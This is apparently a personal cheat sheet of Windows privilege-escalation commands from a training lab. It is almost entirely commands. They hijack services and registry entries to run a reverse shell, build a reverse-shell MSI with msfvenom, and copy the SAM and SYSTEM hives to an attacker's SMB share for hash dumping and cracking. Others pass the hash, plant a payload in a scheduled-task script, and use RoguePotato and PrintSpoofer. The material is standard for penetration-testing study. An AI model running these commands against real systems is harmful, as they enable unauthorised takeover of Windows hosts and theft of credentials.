# Windows Priv Esc

## 0. Commands
### 	copy
Copy file to/from smbserver.py
```
copy C:\\Windows\\Repair\\SAM \\\\10.10.10.10\\kali\\
```
### 	accesschk
1.  Check if a user has permissions for a particular service
```
accesschk.exe /accepteula -uwcqv user daclsvc
```
2. Check directory permissions
```
accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
```
3. Check file permissions
```
accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
```
4. Check a registry value permissions
```
accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
```
### 	sc
1. Check if the service is running or not
```
sc query daclsvc
```
2. Check information about a service
```
sc qc daclsvc
```
3. Configure a service
```
sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
```
### 	reg
1. Check registry values
```
reg query HKLM\System\CurrentControlSet\Services\regsvc
```
2. Modify registry values
```
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
```
3. Find a string in entire hive
```
reg query HKLM /f password /t REG_SZ /s
```
### 	net
1. Start/Stop a service
```
net start/stop regsvc
```
### 	msiexec
1. Install an MSI package
```
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```
### 	winexe
1. Connect using username:password
```
winexe -U 'admin%password' //10.10.57.53 cmd.exe
```
### 	cmdkey
1. List saved credentials
```
cmdkey /list
```
### 	runas
1. Run a command using saved credentials
```
runas /savecred /user:admin C:\PrivEsc\reverse.exe
```
### 	pth-winexe
1. Connect using hash LM:NTLM
```
pth-winexe -U 'admin%hash' //10.10.104.248 cmd.exe
```
### 	tasklist
1. List a task to find the owner
```
tasklist /V | findstr mspaint.exe
```
### 	netstat
1. List all network configurations
```
netstat -ona
```
### 	cscript
1. Create a shortcut in Start Up directory using a vbs script
```
cscript C:\PrivEsc\CreateShortcut.vbs
```
### 	seatbelt
1. List processes
```
seatbelt
```
2. List non standard processes
```
seatbelt NonstandardProcesses
```
### 	socat
1. Bind ports from Local(135)->Remote(10.10.53.151:9999)
```
sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.53.151:9999
```
### 	whoami
1. List current user
```
whoami
```
2. List privs of current user
```
whoami /priv
```
### 	plink
```
plink.exe kali@10.10.10.10 -R 445:127.0.0.1:445
```
## 1. Service Exploits
### Known Services
- daclsvc
	1. `C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc`
	2. `sc qc daclsvc`
	3. `sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""`
	4. `net start daclsvc`
- unquotedsvc
	1. `sc qc unquotedsvc`
	2. `C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"`
	3. `copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"`
	4. `net start unquotedsvc`
- regsvc
	1. `sc qc regsvc`
	2. `C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc`
	3. `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f`
	4. `net start regsvc`
- filepermsvc
	1. `sc qc filepermsvc`
	2. `C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"`
	3. `copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y`
	4. `net start filepermsvc`
## 2. Registry Exploits
### Known Methods
- AutoRuns
	1. `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
	2. `C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"` 
	3. `copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y`
- AlwaysInstallElevated
	1. `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
		`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
	2. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi`
	3. Transfer
	4. `msiexec /quiet /qn /i C:\PrivEsc\reverse.msi`

## 3. Passwords
- Registry
	1. `reg query HKLM /f password /t REG_SZ /s`
	2. `reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"`
	3. `winexe -U 'admin%password' //10.10.57.53 cmd.exe`
- Saved Creds
	1. `cmdkey /list`
	2. `runas /savecred /user:admin C:\PrivEsc\reverse.exe`
- SAM
	1. `copy C:\\Windows\\Repair\\SAM \\\\10.10.10.10\\kali\\`
		`copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\`
	2. `git clone https://github.com/Neohapsis/creddump7.git`
		`sudo apt install python-crypto`
		`python2 creddump7/pwdump.py SYSTEM SAM`
	3. `hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt`
- Passing the hash
	1. `pth-winexe -U 'admin%hash' //10.10.104.248 cmd.exe`
## 4. Scheduled Tasks
1. `schtasks /query /fo LIST /v` or `Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State`
2. `C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1`
3. `echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1`
## 5. Insecure GUI
1. `tasklist /V | findstr mspaint.exe`
## 6. Startup Apps
1. `C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"`
2. `cscript C:\PrivEsc\CreateShortcut.vbs`
## 7. Token Impersonation
- Rogue Potato
	1. `sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.36.43:9999`
	2. `C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe`
	3. `C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999`
- Print Spoofer
	1. `C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe`
	2. `C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i`